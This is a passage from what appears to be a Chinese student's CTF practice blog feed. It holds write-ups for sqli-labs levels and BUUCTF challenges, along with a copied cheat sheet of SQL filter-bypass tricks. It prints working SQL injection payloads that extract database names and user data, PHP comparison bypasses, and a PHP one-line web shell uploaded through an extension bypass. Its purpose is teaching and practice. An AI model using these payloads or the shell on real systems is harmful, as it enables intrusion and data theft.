      <link href="test25/undefined-undefined.html"/>
      <url>test25/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天学习一个新的sql注入方式——双查询注入。  </p><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1><h2 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h2><p>先说明原理：  </p><blockquote><p>原理：简单的一句话原理就是有研究人员发现，当在一个聚合函数，比如count函数后面如果使用分组语句就会把查询的一部分以错误的形式显示出来。</p></blockquote><p>接着介绍一下这个查询方式要用到的函数：  </p><blockquote><p>rand()是一个生成随机数的函数，他会返回0到1之间到一个值。<br>floor()是取整函数了，会返回小于等于你输入的数的整数。<br>count()是一个聚合函数，用户返回符合条件的记录数量。  </p></blockquote><p>那么这三个函数结合到一起会发生什么呢？<br>下面介绍一下双查询注入的格式：  </p><blockquote><p>select count(*),concat_ ws(‘:’,([子查询],floor(rand() *  2))) as a form [table_name] group by a;&lt;&gt;</p></blockquote><p>我们来一点一点的理解这个语句。先看floor(rand() *2))这个叠加函数。 首先这个 rand() *2使最后返回的数大小在0-2之间（因为rand（）函数返回的值在0-1之间，乘2后就在0-2之间了），随后返回的数又经过floor()取整函数，那么最终得到的数要么是0，要么是1。<br>接下来我们扩展这个语句：  </p><blockquote><p>SELECT CONCAT((SELECT database()), FLOOR(RAND()*2));</p></blockquote><p>可以看到我们使用concat将SELECT database()和FLOOR(RAND()*2这两个语句连接起来，concat语句会将两个返回的值连接到一块。比如SELECT concat(‘string1’,’string2’);显示的结果就是string1string2。<br>那么我们可以推断出，这样的语句返回的结果不是security0就是security1了。  </p><p>如果我们把这条语句后面加上from 一个表名。那么一般会返回security0或security1的一个集合。数目是由表本身有几条结果决定的。比如一个管理表里有5个管理员。这个就会返回五条记录，users表里有13个用户，所以返回13条。<br>如果是从information_schema.schemata里，这个表里包含了mysql的所有数据库名。所以当我们from information _ schema.schemata时，它便返回（当前使用的数据库名字+0或1）一共有几个数据库便返回几条结果。  </p><p>但是想要报错count和group by语句是不能少的，接下来我们先用分组语句group by将我们得到的很多条结果（security0和security1）进行分组。  </p><blockquote><p>select concat((select database()), floor(rand()*2))as a from information_schema.tables group by a;</p></blockquote><p>我们给这些结果新建了一个表，通过<strong>as a</strong>起名为a，在这个表里security0的分到一组，security1的分到另一组，那么这时候我们的这个名为a的表里只剩下两个结果了：security0和security1.   </p><p>最后我们便插入聚合函数count(* )，这个函数返回包括所有列，返回表中的记录数，相当于统计表的行数。但是如果我们在这里使用，就会发生报错。（原因是floor( random(0) *2 )的不确定性）  </p><hr><h3 id="报错具体原因"><a href="#报错具体原因" class="headerlink" title="报错具体原因"></a>报错具体原因</h3><p>group by key的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中则更新临时表中的数据；如果该key不存在于临时表中，则在临时表中插入key所在行的数据。group by floor(random(0) * 2)出错的原因是key是个随机数，检测临时表中key是否存在时计算了一下floor(random(0) * 2)可能为0，如果此时临时表只有key为1的行不存在key为0的行，那么数据库要将该条记录插入临时表，由于是随机数，插时又要计算一下随机值，此时floor(random(0)*2)结果可能为1，就会导致插入时冲突而报错。即检测时和插入时两次计算了随机数的值。</p><p>结论是：当与临时表里面的值进行比较，如果不同，就插入，但是插入的时候又计算了一次，所以如果插入时计算的值与直接比较的值不一样，则报错！</p><hr><p>这个报错是很致命的，它会直接将我们所要查的数据库名字，字段的信息给报出来，这也就达到了我们注入的目的。  </p><h2 id="题目解答"><a href="#题目解答" class="headerlink" title="题目解答"></a>题目解答</h2><p>可以看到无论我们怎么输入，页面都只会显示两种界面<br>报错界面<br><a href="https://imgchr.com/i/yMoebQ"><img src="https://s3.ax1x.com/2021/02/03/yMoebQ.md.png" alt="yMoebQ.md.png"></a><br>you are in…界面<br><a href="https://imgchr.com/i/yMol80"><img src="https://s3.ax1x.com/2021/02/03/yMol80.md.png" alt="yMol80.md.png"></a><br>所以这道题我们选择报错注入——双查询注入。<br>构造以下payload：  </p><blockquote><p>?id=1’ and (select count(* ),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a)–+</p></blockquote><p><a href="https://imgchr.com/i/yMoa5R"><img src="https://s3.ax1x.com/2021/02/03/yMoa5R.md.png" alt="yMoa5R.md.png"></a><br>却发现它说只能查一个字段（因为我们原本查询的是所有的结果，而现在只允许查一个字段），这里就要用到派生表的知识。  </p><blockquote><p>派生表是一个查询结果生成的表，类似于临时表。<br>派生表可以简化查询，避免使用临时表。相比手动生成临时性能更优越。派生表与其他表一样出现在查询的FROM子句中<br>select * from (select * from athors)  temp<br>temp 就是派生表</p></blockquote><p>所以我们构建一个这样的派生表，将我们的所有结果放到这个表里，然后查询一个字段。  </p><blockquote><p>?id=1’ and (select 1 from(select count(* ),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a))–+</p></blockquote><p><a href="https://imgchr.com/i/yMo7qg"><img src="https://s3.ax1x.com/2021/02/03/yMo7qg.md.png" alt="yMo7qg.md.png"></a><br>发现又有新的要求：每个派生出来的表都必须有一个自己的别名，所以我们再给这个派生表起一个别名。  </p><blockquote><p>?id=1’ and (select 1 from(select count(* ),concat((select database()),floor(rand(0)*2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><img src="https://i.loli.net/2021/02/03/y12MCKTYIic6nEv.png" alt="8.png"><br>可以看到成功报错了，同时爆出来了当前使用的数据库，注意security1后面的1不是数据库名字中的，它是报错后加上的，并不在原本的数据库名字中。<br>接下来的操作就和以前的sql注入一样了。<br>查表名  </p><blockquote><p>?id=1’ and (select 1 from(select count( * ),concat((select group _concat(table _ name) from information _ schema.tables where table _  schema=’security’),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><img src="https://i.loli.net/2021/02/03/zZB4sNVOSGfryPe.png" alt="9.png"><br>爆字段  </p><blockquote><p>?id=1’ and (select 1 from(select count(* ),concat((select group_ concat(column_name) from information _ schema.columns where table _name=’users’),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><img src="https://i.loli.net/2021/02/03/ufLzkrc6saRJQ7x.png" alt="10.png"><br>但是等到我吗查询字段时又发生了问题。</p><blockquote><p>?id=1’ and (select 1 from(select count( * ),concat((select group_ concat(username) from security.users ),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><a href="https://imgchr.com/i/yMTFo9"><img src="https://s3.ax1x.com/2021/02/03/yMTFo9.md.png" alt="yMTFo9.md.png"></a><br>显示返回的字符超过了1行，导致返回报错，说明group_ concat在这里已经超出了它的长度限度，那么我们使用limit 0,1来一个一个的输出。  </p><blockquote><p>group_concat()函数的作用：将返回信息拼接成一行显示最多显示64个字符<br>limit 0,1  表示输出第一个数据。   0表示输出的起始位置，1表示跨度为1（即输出几个数据，1表示输出一个，2就表示输出两个)</p></blockquote><p>这样构造payload。  </p><blockquote><p>?id=1’ and (select 1 from(select count( * ),concat((select username from security.users limit 0,1),floor(rand(0) *2))as a from information_schema.tables group by a)x)–+</p></blockquote><p><a href="https://imgchr.com/i/yMTmQK"><img src="https://s3.ax1x.com/2021/02/03/yMTmQK.md.png" alt="yMTmQK.md.png"></a><br>通过改变0，1，2，3…..来一个个读取数据。<br>至此，sql的双查询注入就结束了。  </p><h1 id="Less-6"><a href="#Less-6" class="headerlink" title="Less-6"></a>Less-6</h1><p>这道题和第五关几乎一样，唯一不同的就是闭合方式不同，第五关是单引号闭合，这一关是双引号闭合。其余的语句都不变。</p><hr><h1 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h1><p>双查询注入是报错注入的一种方法，报错注入就是利用了sql的语句的报错来获得数据库的信息，除了双查询注入外还有别的报错注入的方法，比如通过updatexml报错，通过ExtractValue报错 ，双查询注入利用的是通过floor报错，这三种方法本质相同，都是利用函数的报错。之后会把另外的报错注入方法总结一下。<br>关于双查询注入，其实还是有一些地方需要继续探究的，下面附上相关博客和双查询注入的格式。  </p><blockquote><p>and (select 1 from (select count(* ),concat(( <strong>payload</strong>),floor (rand(0) *2))x from information_schema.tables group by x)a) </p></blockquote><p><a href="https://www.cnblogs.com/BloodZero/p/4660971.html">双查询报错原因深究</a><br><a href="https://blog.csdn.net/lixiangminghate/article/details/80466257?utm_medium=distribute.pc_relevant.none-task-blog-baidujs_title-2&spm=1001.2101.3001.4242">详细讲解双查询注入</a><br><a href="https://blog.csdn.net/qq_38196334/article/details/88644836?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161228375316780299083354%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161228375316780299083354&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-6-88644836.pc_search_result_cache&utm_term=count&spm=1018.2226.3001.4187">count（）函数的详解</a><br><a href="https://blog.csdn.net/qq_34987215/article/details/84145638?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161233565316780266270424%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161233565316780266270424&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-1-84145638.pc_search_result_cache&utm_term=sql%E6%B4%BE%E7%94%9F%E8%A1%A8&spm=1018.2226.3001.4187">SQL SERVER派生表</a></p>]]></content>
      
      
      <categories>
          
          <category> test25 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习17</title>
      <link href="test24/undefined-undefined.html"/>
      <url>test24/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天原本想写那道[HCTF 2018]admin题目的，但是看了半天还是写不出来，最后看了别人的wp也是懵懵懂懂，所以干脆再往后写一道算了。这道题的wp以后有时间再补吧。  </p><h1 id="极客大挑战-2019-BuyFlag-1"><a href="#极客大挑战-2019-BuyFlag-1" class="headerlink" title="[极客大挑战 2019]BuyFlag 1"></a>[极客大挑战 2019]BuyFlag 1</h1><p>打开题目，告诉我们要花一亿来买flag，而且还要输入正确的密码。<br><img src="https://i.loli.net/2021/02/02/AEOsXwfQeqRtoiW.png" alt="77.png"><br>直接先f12查看源码。<br><img src="https://i.loli.net/2021/02/02/i1YlVUHcsQXPDrE.png" alt="1.png"><br>源码中可以看到让我们用post的方式来上传我们的密码和钱。<br>其中从源码中可以看到密码不能是数字还要等于404。比较的两个等号说明这是一个弱类型比较。昨天刚刚遇到了这类比较，我们只需要在404后面输入非数字字符（比如说404abc）就可以绕过它的比较了。（原理可见昨天的博客）<br>那么直接开始在页面上使用插件来传参，却发现当输入password=404abc后传参发现页面没有发生变化，经过多次尝试后发现一直这样，那么我们只能抓包再传参了。<br>抓包后发现cookie中user这一信息为0，这显然是无法成功传参的，我们将它修改为1.<br><img src="https://i.loli.net/2021/02/02/jvaNYGfWyQzBbsV.png" alt="2.png"><br>然后注意修改传参方式为post（源码中特意提到传参方式）。最后输入密码和钱：passw=404abc&amp;money=100000000.<br><img src="https://i.loli.net/2021/02/02/xtgibGodeT1QuAO.png" alt="3.png"><br>发现失败了，原因是数字的长度太长，也就是说对money的字符长度做出了限制。这里有两种方法绕过这个限制。  </p><h3 id="一、科学计数法绕过"><a href="#一、科学计数法绕过" class="headerlink" title="一、科学计数法绕过"></a>一、科学计数法绕过</h3><p>因为要花一亿来买flag，但又不能直接输入一亿的数字，那么可以用科学计数法来代替直接输入，1e9就是电脑表示100000000的科学计数法，这样就不会导致字符太长而失败。  </p><h3 id="二、数组绕过"><a href="#二、数组绕过" class="headerlink" title="二、数组绕过"></a>二、数组绕过</h3><p>因为这里说字符串长度太长，所以猜测这里使用了strcmp（）函数。  </p><blockquote><p>int strcmp ( string $str1 , string $str2 )<br>参数 str1第一个字符串。str2第二个字符串。如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。</p></blockquote><p>也就是说，只有当str2的长度等于str1的长度时，才能返回0。此外其实还有另一种方法能使其返回为0，那就是报错的时候（在php5.3版本之前）。<br>那么如何使其报错呢，当传入非字符串类型的的数据时，这个函数将发生错误此时将返回0。所以说我们可以传入一个money数组，这样就可以成功使函数报错，从而绕过钱的数额限制。  </p><blockquote><p>password=404abc&amp;money[]=10000  </p></blockquote><hr><p>这道题目主要还是绕过问题，包括弱类型绕过和一个新的函数的绕过。</p>]]></content>
      
      
      <categories>
          
          <category> test24 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql注入练习4</title>
      <link href="test23/undefined-undefined.html"/>
      <url>test23/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>这关和前面的没有什么不同的。  </p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><p>这次后台的sql语句是这样的  </p><blockquote><p>$sql=”SELECT * FROM users WHERE id=(“$id”) LIMIT 0,1”;</p></blockquote><p>那么结合上一关，我们只要在id=1后面加上”)就可以成功闭合。其余的步骤和之前的就一样了。<br>接下来爆库名  </p><blockquote><p>?id=1”) union select 1,2,database()–+</p></blockquote><p>爆表名</p><blockquote><p>?id=1”) union select 1,(select group _concat(table _name) from information _schema.tables where table _  schema=’security’),database()–+</p></blockquote><p>爆字段 </p><blockquote><p>select group_ concat(column_name) from information _ schema.columns where table _name=’users’ </p></blockquote><p>爆字段信息  </p><blockquote><p>select group_ concat(username) from security.users<br>select group_ concat(password) from security.users</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> test23 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习16</title>
      <link href="test22/undefined-undefined.html"/>
      <url>test22/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天又是一道网站备份文件的题目。  </p><h1 id="ACTF2020-新生赛-BackupFile-1"><a href="#ACTF2020-新生赛-BackupFile-1" class="headerlink" title="[ACTF2020 新生赛]BackupFile 1"></a>[ACTF2020 新生赛]BackupFile 1</h1><p>这道题目比较简单，打开题目发现让我们找藏起来的文件，那么应该也就是让我们找到备份文件了。<br>前面我们刚知道备份文件的后缀和名称有很多，而这一题就需要我们使用工具来找到这个文件。<br>这里我使用的是dirsearch这个扫描工具（可以在网上搜索安装）。输入下面命令。  </p><blockquote><p>python dirsearch.py -u <a href="http://13e8bfaa-7a05-43ed-a368-d041ed8501f8.node3.buuoj.cn/">http://13e8bfaa-7a05-43ed-a368-d041ed8501f8.node3.buuoj.cn/</a> -e php<br><img src="https://i.loli.net/2021/02/01/TdFEwY4vZB1bPpX.png" alt="74.png"><br>这个命令需要在cmd中输入，要先进入这个工具所在的目录才能使用。<br>可以发现，这个网页的备份文件为/index.php.bak。<br><img src="https://i.loli.net/2021/02/01/XeuvY2aKsdbI95r.png" alt="75.png"><br>接着我们就可以打开这个文件，查看源码了。  </p></blockquote><p>可以看到源码还是很简单的，通过get方式传入参数赋给key变量，key只能是数字。还定义了一个字符串str，接着就是将key和str进行比较，注意这里是==。两个等号，是弱类型比较，只比较值而不比较变量类型，但是int类型和str类型是无法直接比较的，所以当比较时会将字符串的首串数字提出来，之后的省去，用这串数字来和int类型的变量进行比较。<br>所以说str在比较时所用的字符串也就是123，那么我们传参使key=123就可以了。<br>构造/?key=123就可以得到flag。<br><img src="https://i.loli.net/2021/02/01/SAanwxbRYk4G6Mf.png" alt="76.png"></p><hr><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>关于备份文件也就这么多知识点了，这次还考了比较类型，强弱类型比较并不是很难，下面附上关于这方面的讲解。<br><a href="https://blog.csdn.net/Auuuuuuuu/article/details/79621635?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161217660316780271533658%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=161217660316780271533658&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_v2~rank_v29-2-79621635.pc_search_result_cache&utm_term=php+%E6%95%B0%E5%80%BC%E6%AF%94%E8%BE%83&spm=1018.2226.3001.4187">php中的==和===比较</a></p>]]></content>
      
      
      <categories>
          
          <category> test22 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习15</title>
      <link href="test21/undefined-undefined.html"/>
      <url>test21/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>昨天出去聚会，所以没有写题，明天出去有事，所以今天赶快来一道题练练手。  </p><h1 id="ACTF2020-新生赛-Upload-1"><a href="#ACTF2020-新生赛-Upload-1" class="headerlink" title="[ACTF2020 新生赛]Upload 1"></a>[ACTF2020 新生赛]Upload 1</h1><p>打开题目，可以看到让莪们上传一个文件。很明显这是一道上传木马题。<br><img src="https://i.loli.net/2021/01/30/dIEukpm58owrJKx.png" alt="64.png"><br>直接上传我们的一句话木马。  </p><blockquote><?php @eval($_POST['cmd']) ?></blockquote><p>但是却报错了。<br><img src="https://i.loli.net/2021/01/30/WcBXrUzMyohpkPN.png" alt="69.png"><br>他让我们上传的文件要以jpg,png,gif结尾。而且这个是在上传之前就检查的。所以我们要先在上传之前将文件后缀名改为.jpg或者其他，这样就可以绕过开始的前端检查，进一步进行抓包来进行更多的修改。<br>上传完文件后，抓包查看信息。<br><img src="https://i.loli.net/2021/01/30/ZY9aQzgkHvxIKRX.png" alt="70.png"><br>发现我们的文件成功上传了，可以看出网站后端没有进行更多的内容的检测，但是从上一道上传问题我们可以知道，我们上传的文件最终要是php文件，否则无法执行我们的一句话代码，所以再改一下文件类型。  </p><blockquote><p>filename=”shell.php”</p></blockquote><p>但是被拦截了。<br><img src="https://i.loli.net/2021/01/30/DBp3hFE6q4Z2lnu.png" alt="71.png"><br>说明我们不能上传php文件。那我们就绕过这个后缀。换成phtml。<br><img src="https://i.loli.net/2021/01/30/23nOYk167lZSpcv.png" alt="72.png"><br>可以看到上传成功了。接着就是剑蚁连接这个网址，别忘了需要完整的网址。<br><img src="https://i.loli.net/2021/01/30/oneBQl8h6E2MqJA.png" alt="73.png"><br>在根目录可以找到flag。</p>]]></content>
      
      
      <categories>
          
          <category> test21 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 练习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sql绕过方法笔记</title>
      <link href="note4/undefined-undefined.html"/>
      <url>note4/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>在网上找了不少sql绕过的总结，下面搬运一篇我觉得总结的最简单明了的笔记。  </p><h1 id="一、绕过空格（注释符-，-a0）"><a href="#一、绕过空格（注释符-，-a0）" class="headerlink" title="一、绕过空格（注释符/* */，%a0）"></a>一、绕过空格（注释符/* */，%a0）</h1><p>1.两个空格代替一个空格（双写）</p><p>2.%a0=空格</p><p>3.最基本的绕过方法，用注释替换空格：/<em>注释/</em></p><p>4.括号绕过空格</p><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。</p><p>在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p><p>例如：time based盲注：</p><blockquote><p>?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</p></blockquote><p>上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p><h1 id="二、引号绕过（使用十六进制）"><a href="#二、引号绕过（使用十六进制）" class="headerlink" title="二、引号绕过（使用十六进制）"></a>二、引号绕过（使用十六进制）</h1><p>会使用到引号的地方一般是在最后的where子句中。这个时候如果引号被过滤了，那么where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。</p><p>几乎没有任何注入能过滤十六进制。</p><h1 id="三、逗号绕过（使用from或者offset）"><a href="#三、逗号绕过（使用from或者offset）" class="headerlink" title="三、逗号绕过（使用from或者offset）"></a>三、逗号绕过（使用from或者offset）</h1><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。</p><p>例如：</p><p>使用from to：</p><blockquote><p>select substr(database() from 1 for 1);<br>select mid(database() from 1 for 1);</p></blockquote><p>使用join：</p><blockquote><p>union select 1,2<br>union select * from (select 1)a join (select 2)b</p></blockquote><p>使用like：</p><blockquote><p>select ascii(mid(user(),1,1))=80 #等价于<br>select user() like ‘r%’</p></blockquote><p>使用offset来绕过limit中的”，”：</p><blockquote><p>select * from news limit 0,1<br>select * from news limit 1 offset 0</p></blockquote><h1 id="四、比较符号（-lt-gt-）绕过"><a href="#四、比较符号（-lt-gt-）绕过" class="headerlink" title="四、比较符号（&lt;&gt;）绕过"></a>四、比较符号（&lt;&gt;）绕过</h1><p>过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本</p><p>盲注的时候如果无法使用比较操作符，可使用greatest()、least()。（前者返回最大值，后者返回最小值）</p><blockquote><p>select * from users where id=1 and ascii(substr(database(),0,1))&gt;64<br>select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</p></blockquote><p>使用between and：</p><p>between a and b：返回a，b之间的数据，不包含b。</p><h1 id="五、or-and-xor-not绕过"><a href="#五、or-and-xor-not绕过" class="headerlink" title="五、or and xor not绕过"></a>五、or and xor not绕过</h1><blockquote><p>and=&amp;&amp; ， or=|| ， xor=| ， not=!</p></blockquote><h1 id="六、绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#六、绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="六、绕过注释符号（#，–(后面跟一个空格））过滤"></a>六、绕过注释符号（#，–(后面跟一个空格））过滤</h1><blockquote><p>id=1’ union select 1,2,3||’1</p></blockquote><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><blockquote><p>id=1’ union select 1,2,’3</p></blockquote><h1 id="七、-绕过"><a href="#七、-绕过" class="headerlink" title="七、= 绕过"></a>七、= 绕过</h1><p>使用like 、rlike 、regexp(正则表达式) 或者 使用&lt; 或者 &gt;</p><h1 id="八、绕过union，select，where等"><a href="#八、绕过union，select，where等" class="headerlink" title="八、绕过union，select，where等"></a>八、绕过union，select，where等</h1><h2 id="1-使用注释符绕过："><a href="#1-使用注释符绕过：" class="headerlink" title="1.使用注释符绕过："></a>1.使用注释符绕过：</h2><p>常用注释符：</p><blockquote><p>//，– , /**/, #, –+, – -, ; , %00 , –a</p></blockquote><p>用法：</p><blockquote><p>U/ * * / NION / * * / SE /* */LECT/ * */user，pwd from user</p></blockquote><h2 id="2-使用大小写绕过："><a href="#2-使用大小写绕过：" class="headerlink" title="2.使用大小写绕过："></a>2.使用大小写绕过：</h2><blockquote><p>id=-1’UnIoN/**/SeLeCT</p></blockquote><h2 id="3-内联注释绕过："><a href="#3-内联注释绕过：" class="headerlink" title="3.内联注释绕过："></a>3.内联注释绕过：</h2><blockquote><p>id=-1’/* !UnIoN* / SeLeCT 1,2,concat(/ * !tabl _ name * /) FrOM / * information _ schema* /.tables / * !WHERE * // * !TaBlE_ScHeMa*/ like database()#</p></blockquote><h2 id="4-双关键字绕过"><a href="#4-双关键字绕过" class="headerlink" title="4.双关键字绕过"></a>4.双关键字绕过</h2><p>若删除掉第一个匹配的union就能绕过：</p><blockquote><p>id=-1’UNIunionONSeLselectECT1,2,3–</p></blockquote><h2 id="5-使用URLencode，ascii编码，"><a href="#5-使用URLencode，ascii编码，" class="headerlink" title="5.使用URLencode，ascii编码，"></a>5.使用URLencode，ascii编码，</h2><blockquote><p>%53%45%4c%45%43%54(ascii)</p></blockquote><h2 id="6-函数或特殊符号"><a href="#6-函数或特殊符号" class="headerlink" title="6.函数或特殊符号"></a>6.函数或特殊符号</h2><p>例如：表示admin，oracle中可以用 ‘adm’||’in’ , mysql中可以用 concat(‘adm’,’in’); mssql中可以用：’adm’+’in’</p><h1 id="九、通用绕过（编码）"><a href="#九、通用绕过（编码）" class="headerlink" title="九、通用绕过（编码）"></a>九、通用绕过（编码）</h1><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><p>如:urlencode: or 1=1即%6f%72%20%31%3d%31</p><p>ASCII : Test可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)</p><h1 id="十、等价函数绕过（不同数据库）"><a href="#十、等价函数绕过（不同数据库）" class="headerlink" title="十、等价函数绕过（不同数据库）"></a>十、等价函数绕过（不同数据库）</h1><blockquote><p>hex()、bin() ==&gt; ascii()<br>sleep() ==&gt;benchmark()<br>concat_ws()==&gt;group_concat()<br>mid()、substr() ==&gt; substring()<br>@@user ==&gt; user()<br>@@datadir ==&gt; datadir()  </p></blockquote><p>例如：substring()和substr()无法使用时：</p><blockquote><p>?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74</p></blockquote><p>或者：</p><blockquote><p>substr((select ‘password’),1,1) = 0x70<br>strcmp(left(‘password’,1), 0x69) = 1<br>strcmp(left(‘password’,1), 0x70) = 0<br>strcmp(left(‘password’,1), 0x71) = -1</p></blockquote><h1 id="十一-宽字节注入"><a href="#十一-宽字节注入" class="headerlink" title="十一.宽字节注入"></a>十一.宽字节注入</h1><p>过滤’的时候往往利用的思路是将 ’ 转换为 ’ 。</p><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><p>（1）%df 吃掉 \ 具体的方法是 urlencode(’) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p><blockquote><p>id=-1%df%27union select 1,user(),3–+</p></blockquote><p>（2）将 ’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p><p>一般产生宽字节注入的PHP函数：</p><p>1.replace（）：过滤 ’ \ ，将 ’ 转化为 ’ ，将 \ 转为 \，将 “ 转为 “ 。用思路一。</p><p>2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一</p><p>（防御此漏洞，要将 mysql_query 设置为 binary 的方式）</p><p>3.mysql_real_escape_string()：转义下列字符：</p><p>\x00 \n \r \ ’ “ \x1a</p><p>（防御，将mysql设置为gbk即可）</p>]]></content>
      
      
      <categories>
          
          <category> note4 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>寒假练习14</title>
      <link href="test20/undefined-undefined.html"/>
      <url>test20/undefined-undefined.html</url>
      
        <content type="html"><![CDATA[<p>今天是一道sql注入题目，复习一下sql注入。  </p><h1 id="极客大挑战-2019-BabySQL-1"><a href="#极客大挑战-2019-BabySQL-1" class="headerlink" title="[极客大挑战 2019]BabySQL 1"></a>[极客大挑战 2019]BabySQL 1</h1><p>打开题目，题目说加强了过滤，也就是说这次注入可能有些字符不能使用，首先还是尝试一下万能密码。  </p><blockquote><p>输入username=1’ or 1=1#</p></blockquote><p>发现报错。<br><img src="https://i.loli.net/2021/01/28/SAnK19xHeIiZcLt.png" alt="57.png"><br>可以看到报错显示的是’1=1#’ 附近出现问题，可以知道是or被过滤了，接着用联合查询查一下显示位。  </p><blockquote><p>username=1’ union select 1,2,3#</p></blockquote><p>发现同样报错。<br><img src="https://i.loli.net/2021/01/28/CGxZrIkzdcj2sXK.png" alt="58.png"><br>这里可以看到报错显示的是在’1,2,3#’附近，说明union和select也被过滤了，但是过滤的方式有很多，绕过也有很多方法，如果一个个绕过会很麻烦，比如过滤or可以使用||来绕过，也可以用别的方式绕过，这里我们使用双写绕过。  </p><hr><h2 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h2><p>双写绕过是建立在使用replace（）函数过滤这个条件的，也就是识别出需要过滤的字符，然后将其替换为空。遇到这种情况时，我们可以进行双写来绕过。<br>比如输入un<strong>union</strong>ion，这时函数会检测到字符串中有union这个字符那么就会将它替换为空，去掉中间的union后最终我们仍旧会得到union来达到我们的目的。  </p><hr><p>那我们就先试一下。  </p><blockquote><p>输入username=1’ oorr 1=1# </p></blockquote><p><img src="https://i.loli.net/2021/01/28/1I5nzQJslpTfG6V.png" alt="59.png"><br>发现确实成功了，那么我们接下来的注入都可以这样进行。<br>查看回显位。  </p><blockquote><p>username=1’ ununionion seselectlect 1,2,3#</p></blockquote><p>发现2，3位有回显。<br><img src="https://i.loli.net/2021/01/28/AlVrHmGeIFsbyQZ.png" alt="60.png"><br>接着查看数据库名字。  </p><blockquote><p>1’ ununionion seselectlect 1,2,database()#</p></blockquote><p><img src="https://i.loli.net/2021/01/28/b5vJyfD6QEMaPHg.png" alt="61.png"><br>接下来的操作和前面的题目就差不多一样了，不过要注意的是再后面的注入中发现题目还过滤了where和from字符，这些都是要一个个试出来的。<br>比如输入1’ from#然后查看报错回显中有没有from字符，如果没有，就说明被过滤了，同样要使用双写来绕过。<br>此外当我们输入information时需要注意，information中同样含有or字符，所以这个地方也要局部进行双写。下面附上部分注入语句。  </p><blockquote><p>1’ ununionion seselectlect 1,(selselectect group _ concat(table _ name) frfromom infoorrmation_schema.tables whwhereere table _ schema=’geek’),database()#<br>查看表名</p></blockquote><p><img src="https://i.loli.net/2021/01/28/MgIbr84FCPxdJnA.png" alt="62.png"></p><blockquote><p>seselectlect group_ concat(column_name) frfromom infoorrmation _ schema.columns whwhereere table _name=’b4bsql’<br>查看b4bsql表中的字段。</p></blockquote><blockquote><p>seselectlect group_ concat(password) frfromom geek.b4bsql<br>查看字段信息，得到flag。  </p></blockquote><hr><h1 id="小结"><a href="#小结" class="headerlink" 